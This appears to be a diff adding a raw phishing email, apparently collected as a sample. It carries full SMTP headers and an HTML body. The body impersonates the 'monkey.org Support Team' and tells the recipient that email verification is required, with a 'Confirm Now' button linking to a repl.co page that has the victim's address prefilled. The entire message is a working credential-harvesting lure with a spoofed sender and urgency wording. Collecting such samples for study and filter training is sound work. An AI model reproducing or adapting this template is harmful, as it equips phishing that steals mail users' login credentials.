@@ -1,0 +1,61 @@
+Return-Path:
+ 0100017c82265d33-77cd5fb3-af05-4ba3-bb75-820adb24519e-000000@amazonses.com
+Delivered-To: jose@monkey.org
+X-FDA: 78697349010.02.053AF0D
+Received: from a8-241.smtp-out.amazonses.com (a8-241.smtp-out.amazonses.com
+ [54.240.8.241])	by imf06.b.hostedemail.com (Postfix) with ESMTP id
+ 45B072F8FA7	for <jose@monkey.org>; Fri, 15 Oct 2021 04:12:05 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/simple;
+	s=ug7nbtf4gccmlpwj322ax3p6ow6yfsug; d=amazonses.com; t=1634271124;	
+ =?utf-8?q?h=3DFrom=3ATo=3ASubject=3ADate=3AMessage-ID=3AMIME-Version=3ACont?=
+ =?utf-8?q?ent-Type=3AContent-Transfer-Encoding=3AFeedback-ID=3B?=
+	bh=A6VpRg07YROK8Xt7UdvxfXLiANLZCbaUaK0430Xas7I=;
+	b=I1RaOmdeq7xgycFSueld6NS+RsorRp6kKLnbmejQnIYOTHbpA20Xx93PuXHZM31z
+	8NiFw99EgVM6erTQ8dupqlaxgZDaxs4e/qbDgSgEBsavalHH9Xctale2uU4uhWyW1vb
+	NkgySkZcPVZd9HAbsYU28RuqCxcLjEu9uMK+LqiE=
+From: Admin <no-reply@caterpillarkids.in>
+To: jose@monkey.org
+Subject: Server Notification 
+Date: Fri, 15 Oct 2021 04:12:04 +0000
+Message-ID: <0100017c82265d33-77cd5fb3-af05-4ba3-bb75-820adb24519e-000000@email.amazonses.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+Feedback-ID:
+ 1.us-east-1.ujQXiAbS/F8RVC5UWDT4rdZwi2RoXMsSPnJ+7SAERE4=:AmazonSES
+X-SES-Outgoing: 2021.10.15-54.240.8.241
+X-Stat-Signature: dusqodh16cxph763j5qgmpcgkosous1i
+Authentication-Results: imf06.b.hostedemail.com;	dkim=pass
+ header.d=amazonses.com header.s=ug7nbtf4gccmlpwj322ax3p6ow6yfsug
+ header.b=I1RaOmde;	dmarc=none;	spf=pass (imf06.b.hostedemail.com: domain of
+ 0100017c82265d33-77cd5fb3-af05-4ba3-bb75-820adb24519e-000000@amazonses.com
+ designates 54.240.8.241 as permitted sender) =?utf-8?q?smtp=2Emailfrom=3D01?=
+ =?utf-8?q?00017c82265d33-77cd5fb3-af05-4ba3-bb75-820adb24519e-000000=40amaz?=
+ =?utf-8?q?onses=2Ecom?=
+X-Spam-Status: No, score=-0.87
+X-Rspamd-Server: rspam09
+X-Rspamd-Queue-Id: 45B072F8FA7
+X-HE-Tag: 1634271125-979312
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 82
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<BODY>
+<DIV class=3DrcmBody>
+<P>Hello jose,</P>
+<P>Email verification is required to continue using this email!</P>
+<P><A style=3D"FONT-SIZE: 15px; TEXT-DECORATION: none; WIDTH: 50%; BACKGROU=
+ND: rgb(220,60,0) 0% 50%; COLOR: white; PADDING-BOTTOM: 15px; TEXT-ALIGN: c=
+enter; PADDING-TOP: 15px; PADDING-LEFT: 15px; DISPLAY: block; PADDING-RIGHT=
+: 15px; -moz-background-clip: -moz-initial; -moz-background-origin: -moz-in=
+itial; -moz-background-inline-policy: -moz-initial" href=3D"https://antique=
+squeakywrapper.w123456.repl.co/#jose@monkey.org" rel=3Dnoreferrer target=3D=
+_blank>Confirm Now </A></P>
+<P>Note: You must verify your account using&nbsp;jose@monkey.org before you=
+ can send mail.</P>
+<P>Sincerely <BR>monkey.org Support Team. </P></DIV></BODY></HTML>
+
